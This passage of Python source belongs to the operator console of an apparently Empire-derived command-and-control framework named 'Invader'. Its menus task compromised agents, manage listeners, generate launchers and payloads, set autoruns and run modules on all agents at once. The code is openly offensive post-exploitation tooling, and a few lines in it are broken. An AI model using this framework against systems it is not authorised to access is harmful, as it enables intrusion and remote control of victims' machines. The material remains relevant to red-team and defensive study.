            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_loadpy(self, line):
        "Import zip file containing a .py module."

        path = line.strip()
        #check the file ext and confirm that the path given is a file
        if os.path.splitext(path)[-1] == '.zip' and os.path.isfile(path):
            #open a handle to the file and save the data to a variable, zlib compress
            filename = os.path.basename(path).rstrip('.zip')
            open_file = open(path, 'rb')
            module_data = open_file.read()
            open_file.close()

            # dispatch this event
            message = "[*] Tasked agent to import {}, md5: {}".format(path, hashlib.md5(module_data).hexdigest())
            signal = json.dumps({
                'print': True,
                'message': message,
                'import_path': path,
                'import_md5': hashlib.md5(module_data).hexdigest()
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            msg = "Tasked agent to import "+path+" : "+hashlib.md5(module_data).hexdigest()
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

            c = compress.compress()
            start_crc32 = c.crc32_data(module_data)
            comp_data = c.comp_data(module_data, 9)
            module_data = c.build_header(comp_data, start_crc32)
            module_data = helpers.encode_base64(module_data)
            data = filename + '|' + module_data
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_IMPORT_MODULE", data)
        else:
            print helpers.color("[!] Please provide a valid zipfile path", color="red")

            
    def do_repo(self, line):
        "View the contents of a repo."
        repoName = line.strip()

        # dispatch this event
        message = "[*] Tasked agent to view repo contents: {}".format(repoName)
        signal = json.dumps({
            'print': True,
            'message': message,
            'repo_name': repoName
        })
        dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

        # update the agent log
        msg = "[*] Tasked agent to view repo contents: " + repoName
        self.mainMenu.agents.save_agent_log(self.sessionID, msg)

        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_VIEW_MODULE", repoName)

    def do_rmrepo(self, line):
        "Remove a repo."
        repoName = line.strip()

        # dispatch this event
        message = "[*] Tasked agent to remove repo: {}".format(repoName)
        signal = json.dumps({
            'print': True,
            'message': message,
            'repo_name': repoName
        })
        dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

        msg = "[*] Tasked agent to remove repo: "+repoName
        print helpers.color(msg, color="green")
        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_REMOVE_MODULE", repoName)

    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)

    def complete_loadpy(self, text, line, begidx, endidx):
        "Tab-complete a zip file path."
        return helpers.complete_path(text, line)

    def complete_pys(self, text, line, begidx, endidx):
        "Tab-complete a zip file path."
        return helpers.complete_path(text, line)

    def complete_use(self, text, line, begidx, endidx):
        "Tab-complete an Invader Python module path."
        return self.mainMenu.complete_use(text, line, begidx, endidx, language='python')


    def complete_upload(self, text, line, begidx, endidx):
        "Tab-complete an upload file path."
        return helpers.complete_path(text, line)

    # def complete_updateprofile(self, text, line, begidx, endidx):
    #     "Tab-complete an updateprofile path"
    #     return helpers.complete_path(text,line)


class ListenersMenu(SubMenu):
    """
    The main class used by Invader to drive the 'listener' menu.
    """
    def __init__(self, mainMenu):
        SubMenu.__init__(self, mainMenu)

        self.doc_header = 'Listener Commands'

        # set the prompt text
        self.prompt = '(Invader: ' + helpers.color('listeners', color='blue') + ')> '

        # display all active listeners on menu startup
        messages.display_listeners(self.mainMenu.listeners.activeListeners)
        messages.display_listeners(self.mainMenu.listeners.get_inactive_listeners(), "Inactive")

    def do_back(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_list(self, line):
        "List all active listeners (or agents)."

        if line.lower().startswith('agents'):
            self.mainMenu.do_list('agents ' + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("listeners"):
            self.mainMenu.do_list('listeners ' + str(' '.join(line.split(' ')[1:])))
        else:
            self.mainMenu.do_list('listeners ' + str(line))


    def do_kill(self, line):
        "Kill one or all active listeners."

        listenerID = line.strip()

        if listenerID.lower() == 'all':
            try:
                choice = raw_input(helpers.color('[?] Kill all listeners? [y/N] ', 'red'))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    self.mainMenu.listeners.kill_listener('all')
            except KeyboardInterrupt:
                print ''

        else:
            self.mainMenu.listeners.kill_listener(listenerID)

    def do_delete(self, line):
        "Delete listener(s) from the database."

        listener_id = line.strip()

        if listener_id.lower() == "all":
            try:
                choice = raw_input(helpers.color("[?] Delete all listeners? [y/N] ", "red"))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    self.mainMenu.listeners.delete_listener("all")
            except KeyboardInterrupt:
                print ''

        else:
            self.mainMenu.listeners.delete_listener(listener_id)

    def do_payload(self, line):
        "Select an Invader payload."

        parts = line.split(' ')

        if parts[0] not in self.mainMenu.payloads.payloads:
            print helpers.color("[!] Error: invalid payload module")

        elif len(parts) == 1:
            payload_menu = payloadMenu(self.mainMenu, parts[0])
            payload_menu.cmdloop()
        elif len(parts) == 2:
            listener = parts[1]
            if not self.mainMenu.listeners.is_listener_valid(listener):
                print helpers.color("[!] Please enter a valid listener name or ID")
            else:
                self.mainMenu.payloads.set_payload_option('Listener', listener)
                payload_menu = payloadMenu(self.mainMenu, parts[0])
                payload_menu.cmdloop()
        else:
            print helpers.color("[!] Error in ListenerMenu's do_userpayload()")


    def do_listener(self, line):
        "Select an Invader listener."

        parts = line.split(' ')

        if parts[0] not in self.mainMenu.listeners.loadedListeners:
            print helpers.color("[!] Error: invalid listener module")
        else:
            listenerMenu = ListenerMenu(self.mainMenu, parts[0])
            listenerMenu.cmdloop()


    def do_info(self, line):
        "Display information for the given active listener."

        listenerName = line.strip()

        if listenerName not in self.mainMenu.listeners.activeListeners:
            print helpers.color("[!] Invalid listener name")
        else:
            messages.display_active_listener(self.mainMenu.listeners.activeListeners[listenerName])


    def do_launcher(self, line):
        "Generate an initial launcher for a listener."

        parts = line.strip().split()
        if len(parts) != 2:
            print helpers.color("[!] Please enter 'launcher <language> <listenerName>'")
            return
        else:
            language = parts[0].lower()
            listenerName = self.mainMenu.listeners.get_listener_name(parts[1])

        if listenerName:
            try:
                # set the listener value for the launcher
                listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]
                payload = self.mainMenu.payloads.payloads['multi/launcher']
                payload.options['Listener']['Value'] = listenerName
                payload.options['Language']['Value'] = language
                payload.options['Base64']['Value'] = "True"
                try:
                    payload.options['Proxy']['Value'] = listenerOptions['options']['Proxy']['Value']
                    payload.options['ProxyCreds']['Value'] = listenerOptions['options']['ProxyCreds']['Value']
                except:
                    pass
                if self.mainMenu.obfuscate:
                    payload.options['Obfuscate']['Value'] = "True"
                else:
                    payload.options['Obfuscate']['Value'] = "False"

                # dispatch this event
                message = "[*] Generated launcher"
                signal = json.dumps({
                    'print': False,
                    'message': message,
                    'options': payload.options
                })
                dispatcher.send(signal, sender="Invader")

                print payload.generate()
            except Exception as e:
                print helpers.color("[!] Error generating launcher: %s" % (e))

        else:
            print helpers.color("[!] Please enter a valid listenerName")

    def do_enable(self, line):
        "Enables one or all listners."

        listenerID = line.strip()

        if listenerID == '':
            print helpers.color("[!] Please provide a listener name")
        elif listenerID.lower() == 'all':
            try:
                choice = raw_input(helpers.color('[?] Start all listeners? [y/N] ', 'red'))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    self.mainMenu.listeners.enable_listener('all')
            except KeyboardInterrupt:
                print ''

        else:
            self.mainMenu.listeners.enable_listener(listenerID)

    def do_disable(self, line):
        "Disables one or all listeners."

        listenerID = line.strip()

        if listenerID.lower() == 'all':
            try:
                choice = raw_input(helpers.color('[?] Stop all listeners? [y/N] ', 'red'))
                if choice.lower() != '' and choice.lower()[0] == 'y':
                    self.mainMenu.listeners.shutdown_listener('all')
            except KeyboardInterrupt:
                print ''

        else:
            self.mainMenu.listeners.disable_listener(listenerID)

    def do_edit(self,line):
        "Change a listener option."

        arguments = line.strip().split(" ")
        if len(arguments) < 2:
            print helpers.color("[!] edit <listener name> <option name> <option value> (leave value blank to unset)")
            return
        if len(arguments) == 2:
            arguments.append("")
        self.mainMenu.listeners.update_listener_options(arguments[0], arguments[1], arguments[2])
        if arguments[0] in self.mainMenu.listeners.activeListeners.keys():
            print helpers.color("[*] This change will not take effect until the listener is restarted")

    def complete_payload(self, text, line, begidx, endidx):
        "Tab-complete an Invader payload path."
        return self.mainMenu.complete_payload(text, line, begidx, endidx)


    def complete_kill(self, text, line, begidx, endidx):
        "Tab-complete listener names."

        # get all the listener names
        names = self.mainMenu.listeners.activeListeners.keys() + ["all"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_enable(self, text, line, begidx, endidx):
        # tab complete for inactive listener names

        inactive = self.mainMenu.listeners.get_inactive_listeners()
        names = inactive.keys()
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_disable(self, text, line, begidx, endidx):
        # tab complete for listener names
        # get all the listener names
        names = self.mainMenu.listeners.activeListeners.keys() + ["all"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_delete(self, text, line, begidx, endidx):
        # tab complete for listener names
        # get all the listener names
        names = self.mainMenu.listeners.activeListeners.keys() + ["all"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_launcher(self, text, line, begidx, endidx):
        "Tab-complete language types and listener (names/IDs)."

        languages = ['powershell', 'python']

        if line.split(' ')[1].lower() in languages:
            # if we already have a language name, tab-complete listener names
            listenerNames = self.mainMenu.listeners.get_listener_names()
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]
        else:
            # otherwise tab-complate the payload names
            mline = line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in languages if s.startswith(mline)]


    def complete_info(self, text, line, begidx, endidx):
        "Tab-complete listener (names/IDs)."

        # get all the listener names
        names = self.mainMenu.listeners.activeListeners.keys()
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


    def complete_listener(self, text, line, begidx, endidx):
        "Tab-complete a listener command."

        names = self.mainMenu.listeners.loadedListeners.keys()
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


class ListenerMenu(SubMenu):

    def __init__(self, mainMenu, listenerName):

        SubMenu.__init__(self, mainMenu)

        if listenerName not in self.mainMenu.listeners.loadedListeners:
            print helpers.color("[!] Listener '%s' not currently valid!" % (listenerName))
            raise NavListeners()

        self.doc_header = 'Listener Commands'

        self.listener = self.mainMenu.listeners.loadedListeners[listenerName]
        self.listenerName = listenerName

        # set the text prompt
        self.prompt = '(Invader: ' + helpers.color("listeners/%s" % (listenerName), 'red') + ')> '

    def do_info(self, line):
        "Display listener options."
        messages.display_listener_module(self.listener)


    def do_execute(self, line):
        "Execute the given listener."

        self.mainMenu.listeners.start_listener(self.listenerName, self.listener)


    def do_launcher(self, line):
        "Generate an initial launcher for this listener."

        self.listenerName = self.listener.options['Name']['Value']
        parts = line.strip().split()

        if len(parts) != 1:
            print helpers.color("[!] Please enter 'launcher <language>'")
            return

        try:
            # set the listener value for the launcher
            listenerOptions = self.mainMenu.listeners.activeListeners[self.listenerName]
            payload = self.mainMenu.payloads.payloads['multi/launcher']
            payload.options['Listener']['Value'] = self.listenerName
            payload.options['Language']['Value'] = parts[0]
            payload.options['Base64']['Value'] = "True"
            try:
                payload.options['Proxy']['Value'] = listenerOptions['options']['Proxy']['Value']
                payload.options['ProxyCreds']['Value'] = listenerOptions['options']['ProxyCreds']['Value']
            except:
                pass

            # dispatch this event
            message = "[*] Generated launcher"
            signal = json.dumps({
                'print': False,
                'message': message,
                'options': payload.options
            })
            dispatcher.send(signal, sender="Invader")

            print payload.generate()
        except Exception as e:
            print helpers.color("[!] Error generating launcher: %s" % (e))


    def do_set(self, line):
        "Set a listener option."

        parts = line.split()

        try:
            option = parts[0]
            if option not in self.listener.options:
                print helpers.color("[!] Invalid option specified.")

            elif len(parts) == 1:
                # "set OPTION"
                # check if we're setting a switch
                if self.listener.options[option]['Description'].startswith("Switch."):
                    self.listener.options[option]['Value'] = "True"
                else:
                    print helpers.color("[!] Please specify an option value.")
            else:
                # otherwise "set OPTION VALUE"
                option = parts[0]
                value = ' '.join(parts[1:])

                if value == '""' or value == "''":
                    value = ""

                self.mainMenu.listeners.set_listener_option(self.listenerName, option, value)

        except Exception as e:
            print helpers.color("[!] Error in setting listener option: %s" % (e))


    def do_unset(self, line):
        "Unset a listener option."

        option = line.split()[0]

        if line.lower() == "all":
            for option in self.listener.options:
                self.listener.options[option]['Value'] = ''
        if option not in self.listener.options:
            print helpers.color("[!] Invalid option specified.")
        else:
            self.listener.options[option]['Value'] = ''


    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a listener option to set."

        options = self.listener.options.keys()

        if line.split(' ')[1].lower().endswith('path'):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(' ')[1].lower().endswith('file'):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(' ')[1].lower().endswith('host'):
            return [helpers.lhost()]

        elif line.split(' ')[1].lower().endswith('listener'):
            listenerNames = self.mainMenu.listeners.get_listener_names()
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]

        # otherwise we're tab-completing an option name
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete a module option to unset."

        options = self.listener.options.keys()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_launcher(self, text, line, begidx, endidx):
        "Tab-complete language types."

        languages = ['powershell', 'python']

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in languages if s.startswith(mline)]


class ModuleMenu(SubMenu):
    """
    The main class used by Invader to drive the 'module' menu.
    """
    def __init__(self, mainMenu, moduleName, agent=None):

        SubMenu.__init__(self, mainMenu)
        self.doc_header = 'Module Commands'

        try:
            # get the current module/name
            self.moduleName = moduleName
            self.module = self.mainMenu.modules.modules[moduleName]

            # set the prompt text
            self.prompt = '(Invader: ' + helpers.color(self.moduleName, color="blue") + ')> '

            # if this menu is being called from an agent menu
            if agent and 'Agent' in self.module.options:
                # resolve the agent sessionID to a name, if applicable
                agent = self.mainMenu.agents.get_agent_name_db(agent)
                self.module.options['Agent']['Value'] = agent

        except Exception as e:
            print helpers.color("[!] ModuleMenu() init error: %s" % (e))

    def validate_options(self, prompt):
        "Ensure all required module options are completed."

        # ensure all 'Required=True' options are filled in
        for option, values in self.module.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                print helpers.color("[!] Error: Required module option missing.")
                return False

        # 'Agent' is set for all but external/* modules
        if 'Agent' in self.module.options:
            sessionID = self.module.options['Agent']['Value']
            try:
                # if we're running this module for all agents, skip this validation
                if sessionID.lower() != "all" and sessionID.lower() != "autorun":
                    moduleLangVersion = float(self.module.info['MinLanguageVersion'])
                    agentLangVersion = float(self.mainMenu.agents.get_language_version_db(sessionID))

                    # check if the agent/module PowerShell versions are compatible
                    if moduleLangVersion > agentLangVersion:
                        print helpers.color("[!] Error: module requires language version %s but agent running version %s" % (moduleLangVersion, agentPSVersion))
                        return False
            except Exception as e:
                print helpers.color("[!] Invalid module or agent language version: %s" % (e))
                return False

            # check if the module needs admin privs
            if self.module.info['NeedsAdmin']:
                # if we're running this module for all agents, skip this validation
                if sessionID.lower() != "all" and sessionID.lower() != "autorun":
                    if not self.mainMenu.agents.is_agent_elevated(sessionID):
                        print helpers.color("[!] Error: module needs to run in an elevated context.")
                        return False

        # if the module isn't opsec safe, prompt before running (unless "execute noprompt" was issued)
        if prompt and ('OpsecSafe' in self.module.info) and (not self.module.info['OpsecSafe']):

            try:
                choice = raw_input(helpers.color("[?] Module is not opsec safe, run? [y/N] ", "red"))
                if not (choice.lower() != "" and choice.lower()[0] == "y"):
                    return False
            except KeyboardInterrupt:
                print ""
                return False

        return True

    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")

    def do_reload(self, line):
        "Reload the current module."

        print "\n" + helpers.color("[*] Reloading module") + "\n"

        # reload the specific module
        self.mainMenu.modules.reload_module(self.moduleName)
        # regrab the reference
        self.module = self.mainMenu.modules.modules[self.moduleName]


    def do_info(self, line):
        "Display module options."
        messages.display_module(self.moduleName, self.module)


    def do_options(self, line):
        "Display module options."
        messages.display_module(self.moduleName, self.module)


    def do_set(self, line):
        "Set a module option."

        parts = line.split()

        try:
            option = parts[0]
            if option not in self.module.options:
                print helpers.color("[!] Invalid option specified.")

            elif len(parts) == 1:
                # "set OPTION"
                # check if we're setting a switch
                if self.module.options[option]['Description'].startswith("Switch."):
                    self.module.options[option]['Value'] = "True"
                else:
                    print helpers.color("[!] Please specify an option value.")
            else:
                # otherwise "set OPTION VALUE"
                option = parts[0]
                value = ' '.join(parts[1:])

                if value == '""' or value == "''":
                    value = ""

                self.module.options[option]['Value'] = value
        except:
            print helpers.color("[!] Error in setting option, likely invalid option name.")


    def do_unset(self, line):
        "Unset a module option."

        option = line.split()[0]

        if line.lower() == "all":
            for option in self.module.options:
                self.module.options[option]['Value'] = ''
        if option not in self.module.options:
            print helpers.color("[!] Invalid option specified.")
        else:
            self.module.options[option]['Value'] = ''


    def do_use(self, line):
        "Use an Invader PowerShell module."

        # Strip asterisks added by MainMenu.complete_use()
        module = line.strip().rstrip("*")

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            _agent = ''
            if 'Agent' in self.module.options:
                _agent = self.module.options['Agent']['Value']

	        line = line.strip("*")
            module_menu = ModuleMenu(self.mainMenu, line, agent=_agent)
            module_menu.cmdloop()


    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)


    def do_execute(self, line):
        "Execute the given Invader module."

        prompt = True
        if line == "noprompt":
            prompt = False

        if not self.validate_options(prompt):
            return

        if self.moduleName.lower().startswith('external/'):
            # external/* modules don't include an agent specification, and only have
            #   an execute() method
            self.module.execute()
        else:
            agentName = self.module.options['Agent']['Value']
            moduleData = self.module.generate(self.mainMenu.obfuscate, self.mainMenu.obfuscateCommand)

            if not moduleData or moduleData == "":
                print helpers.color("[!] Error: module produced an empty script")
            try:
                moduleData.decode('ascii')
            except UnicodeDecodeError:
                print helpers.color("[!] Error: module source contains non-ascii characters")
                return

            # strip all comments from the module
            moduleData = helpers.strip_powershell_comments(moduleData)

            taskCommand = ""

            # build the appropriate task command and module data blob
            if str(self.module.info['Background']).lower() == "true":
                # if this module should be run in the background
                extention = self.module.info['OutputExtension']
                if extention and extention != "":
                    # if this module needs to save its file output to the server
                    #   format- [15 chars of prefix][5 chars extension][data]
                    saveFilePrefix = self.moduleName.split("/")[-1]
                    moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                    taskCommand = "TASK_CMD_JOB_SAVE"
                else:
                    taskCommand = "TASK_CMD_JOB"
            else:
                # if this module is run in the foreground
                extention = self.module.info['OutputExtension']
                if self.module.info['OutputExtension'] and self.module.info['OutputExtension'] != "":
                    # if this module needs to save its file output to the server
                    #   format- [15 chars of prefix][5 chars extension][data]
                    saveFilePrefix = self.moduleName.split("/")[-1][:15]
                    moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                    taskCommand = "TASK_CMD_WAIT_SAVE"
                else:
                    taskCommand = "TASK_CMD_WAIT"

            # if we're running the module on all modules
            if agentName.lower() == "all":
                try:
                    choice = raw_input(helpers.color("[?] Run module on all agents? [y/N] ", "red"))
                    if choice.lower() != "" and choice.lower()[0] == "y":

                        # signal everyone with what we're doing
                        message = "[*] Tasking all agents to run {}".format(self.moduleName)
                        signal = json.dumps({
                            'print': True,
                            'message': message
                        })
                        dispatcher.send(signal, sender="agents/all/{}".format(self.moduleName))

                        # actually task the agents
                        for agent in self.mainMenu.agents.get_agents_db():

                            sessionID = agent['session_id']

                            # set the agent's tasking in the cache
                            self.mainMenu.agents.add_agent_task_db(sessionID, taskCommand, moduleData)

                            # update the agent log
                            # dispatcher.send("[*] Tasked agent "+sessionID+" to run module " + self.moduleName, sender="Invader")
                            message = "[*] Tasked agent {} to run module {}".format(sessionID, self.moduleName)
                            signal = json.dumps({
                                'print': True,
                                'message': message,
                                'options': self.module.options
                            })
                            dispatcher.send(signal, sender="agents/{}/{}".format(sessionID, self.moduleName))
                            msg = "Tasked agent to run module {}".format(self.moduleName)
                            self.mainMenu.agents.save_agent_log(sessionID, msg)

                except KeyboardInterrupt:
                    print ""

            # set the script to be the global autorun
            elif agentName.lower() == "autorun":

                self.mainMenu.agents.set_autoruns_db(taskCommand, moduleData)
                message = "[*] Set module {} to be global script autorun.".format(self.moduleName)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents")

            else:
                if not self.mainMenu.agents.is_agent_present(agentName):
                    print helpers.color("[!] Invalid agent name.")
                else:
                    # set the agent's tasking in the cache
                    self.mainMenu.agents.add_agent_task_db(agentName, taskCommand, moduleData)

                    # update the agent log
                    message = "[*] Tasked agent {} to run module {}".format(agentName, self.moduleName)
                    signal = json.dumps({
                        'print': True,
                        'message': message,
                        'options': self.module.options
                    })
                    dispatcher.send(signal, sender="agents/{}/{}".format(agentName, self.moduleName))
                    msg = "Tasked agent to run module %s" % (self.moduleName)
                    self.mainMenu.agents.save_agent_log(agentName, msg)


    def do_run(self, line):
        "Execute the given Invader module."
        self.do_execute(line)


    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        if name != "" and self.mainMenu.agents.is_agent_present(name):
            # resolve the passed name to a sessionID
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            agent_menu = AgentMenu(self.mainMenu, sessionID)
        else:
            print helpers.color("[!] Please enter a valid agent name")


    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a module option to set."

        options = self.module.options.keys()

        if line.split(' ')[1].lower() == "agent":
            # if we're tab-completing "agent", return the agent names
            agentNames = self.mainMenu.agents.get_agent_names_db() + ["all", "autorun"]
            end_line = ' '.join(line.split(' ')[1:])

            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in agentNames if s.startswith(mline)]

        elif line.split(' ')[1].lower() == "listener":
            # if we're tab-completing a listener name, return all the names
            listenerNames = self.mainMenu.listeners.get_listener_names()
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]

        elif line.split(' ')[1].lower().endswith("path"):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(' ')[1].lower().endswith("file"):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(' ')[1].lower().endswith("host"):
            return [helpers.lhost()]

        elif line.split(' ')[1].lower().endswith("language"):
            languages = ['powershell', 'python']
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in languages if s.startswith(mline)]

        # otherwise we're tab-completing an option name
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete a module option to unset."

        options = self.module.options.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_use(self, text, line, begidx, endidx):
        "Tab-complete an Invader PowerShell module path."
        return self.mainMenu.complete_use(text, line, begidx, endidx)


    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        return self.mainMenu.complete_creds(text, line, begidx, endidx)


    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command."

        names = self.mainMenu.agents.get_agent_names_db()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


class payloadMenu(SubMenu):
    """
    The main class used by Invader to drive the 'payload' menu.
    """
    def __init__(self, mainMenu, payloadName, listener=None):
        SubMenu.__init__(self, mainMenu)
        self.doc_header = 'payload Menu'

        # get the current payload name
        self.payloadName = payloadName
        self.payload = self.mainMenu.payloads.payloads[payloadName]

        # set the prompt text
        self.prompt = '(Invader: ' + helpers.color("payload/" + self.payloadName, color="blue") + ')> '

        # if this menu is being called from an listener menu
        if listener:
            # resolve the listener ID to a name, if applicable
            listener = self.mainMenu.listeners.get_listener(listener)
            self.payload.options['Listener']['Value'] = listener

    def validate_options(self):
        "Make sure all required payload options are completed."

        for option, values in self.payload.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                print helpers.color("[!] Error: Required payload option missing.")
                return False

        listenerName = self.payload.options['Listener']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            print helpers.color("[!] Invalid listener ID or name.")
            return False

        return True

    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")


    def do_info(self, line):
        "Display payload options."
        messages.display_payload(self.payload)


    def do_options(self, line):
        "Display payload options."
        messages.display_payload(self.payload)


    def do_set(self, line):
        "Set a payload option."

        parts = line.split()

        try:
            option = parts[0]
            if option not in self.payload.options:
                print helpers.color("[!] Invalid option specified.")

            elif len(parts) == 1:
                # "set OPTION"
                # check if we're setting a switch
                if self.payload.options[option]['Description'].startswith("Switch."):
                    self.payload.options[option]['Value'] = "True"
                else:
                    print helpers.color("[!] Please specify an option value.")
            else:
                # otherwise "set OPTION VALUE"
                option = parts[0]
                value = ' '.join(parts[1:])

                if value == '""' or value == "''":
                    value = ""

                self.payload.options[option]['Value'] = value
        except:
            print helpers.color("[!] Error in setting option, likely invalid option name.")


    def do_unset(self, line):
        "Unset a payload option."

        option = line.split()[0]

        if line.lower() == "all":
            for option in self.payload.options:
                self.payload.options[option]['Value'] = ''
        if option not in self.payload.options:
            print helpers.color("[!] Invalid option specified.")
        else:
            self.payload.options[option]['Value'] = ''


    def do_generate(self, line):
        "Generate/execute the given Invader payload."
        if not self.validate_options():
            return

        payloadOutput = self.payload.generate()

        savePath = ''
        if 'OutFile' in self.payload.options:
            savePath = self.payload.options['OutFile']['Value']

        if savePath != '':
            # make the base directory if it doesn't exist
            if not os.path.exists(os.path.dirname(savePath)) and os.path.dirname(savePath) != '':
                os.makedirs(os.path.dirname(savePath))

            # if we need to write binary output for a .dll
            if ".dll" in savePath:
                out_file = open(savePath, 'wb')
                out_file.write(bytearray(payloadOutput))
                out_file.close()
            else:
                # otherwise normal output
                out_file = open(savePath, 'w')
                out_file.write(payloadOutput)
                out_file.close()

            # if this is a bash script, make it executable
            if ".sh" in savePath:
                os.chmod(savePath, 777)

            print "\n" + helpers.color("[*] Payload output written out to: %s\n" % (savePath))
            # dispatch this event
            message = "[*] Generated payload"
            signal = json.dumps({
                'print': False,
                'message': message,
                'options': self.payload.options
            })
            dispatcher.send(signal, sender="Invader")
        else:
            print payloadOutput


    def do_execute(self, line):
        "Generate/execute the given Invader payload."
        self.do_generate(line)


    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        if name != "" and self.mainMenu.agents.is_agent_present(name):
            # resolve the passed name to a sessionID
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            agent_menu = AgentMenu(self.mainMenu, sessionID)
        else:
            print helpers.color("[!] Please enter a valid agent name")


    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a payload option to set."

        options = self.payload.options.keys()

        if line.split(' ')[1].lower() == "listener":
            # if we're tab-completing a listener name, return all the names
            listenerNames = self.mainMenu.listeners.get_listener_names()
            end_line = ' '.join(line.split(' ')[1:])

            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]
        elif line.split(' ')[1].lower().endswith("language"):
            languages = ['powershell', 'python']
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in languages if s.startswith(mline)]

        elif line.split(' ')[1].lower().endswith("path"):
            # tab-complete any payload option that ends with 'path'
            return helpers.complete_path(text, line, arg=True)

        # otherwise we're tab-completing an option name
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete a payload option to unset."

        options = self.payload.options.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command."

        names = self.mainMenu.agents.get_agent_names_db()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]
